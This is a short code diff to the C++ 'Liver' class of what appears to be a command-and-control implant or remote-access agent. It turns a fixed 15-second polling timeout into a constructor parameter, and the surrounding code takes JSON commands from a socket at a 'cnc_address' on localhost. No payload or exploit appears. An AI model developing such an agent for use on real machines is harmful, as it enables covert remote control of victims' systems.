@@ -12,10 +12,14 @@
 #include "Networking/Socket.hpp"
 #include "Synchronization/Event.hpp"
 
-Liver::Liver(Event::Ptr quit_event, ICommandFactory::Ptr command_factory, ICommunicator::Ptr communicator) :
+Liver::Liver(Event::Ptr quit_event,
+             ICommandFactory::Ptr command_factory,
+             ICommunicator::Ptr communicator,
+             const Time::Duration iteration_timeout) :
 	m_quit_event(std::move(quit_event)),
 	m_command_factory(std::move(command_factory)),
 	m_communicator(std::move(communicator)),
+	m_iteration_timeout(iteration_timeout),
 	libraries()
 {
 }
@@ -24,8 +28,7 @@ void Liver::run()
 {
 	TRACE(L"running liver")
 
-	static constexpr Time::Duration ITERATION_TIMEOUT = Time::Seconds(15);
-	while (m_quit_event->wait(ITERATION_TIMEOUT) == WaitStatus::TIMEOUT)
+	while (m_quit_event->wait(m_iteration_timeout) == WaitStatus::TIMEOUT)
 	{
 		try
 		{
@@ -64,10 +67,12 @@ std::unique_ptr<Liver> Liver::create([[maybe_unused]] const Buffer& liver_config
 	static constexpr uint32_t LOCALHOST = 0x7f000001;
 	static constexpr uint16_t DEFAULT_PORT = 8080;
 	static constexpr SocketAddress cnc_address = {LOCALHOST, DEFAULT_PORT};
+	static constexpr Time::Duration ITERATION_TIMEOUT = Time::Seconds(15);
 	return std::make_unique<Liver>(
 		std::make_shared<Event>(quit_event_name(), Event::Type::MANUAL_RESET),
 		std::make_unique<JsonCommandFactory>(),
-		RawCommunicator::from_stream(std::make_shared<Socket>(cnc_address))
+		RawCommunicator::from_stream(std::make_shared<Socket>(cnc_address)),
+		ITERATION_TIMEOUT
 	);
 }
 
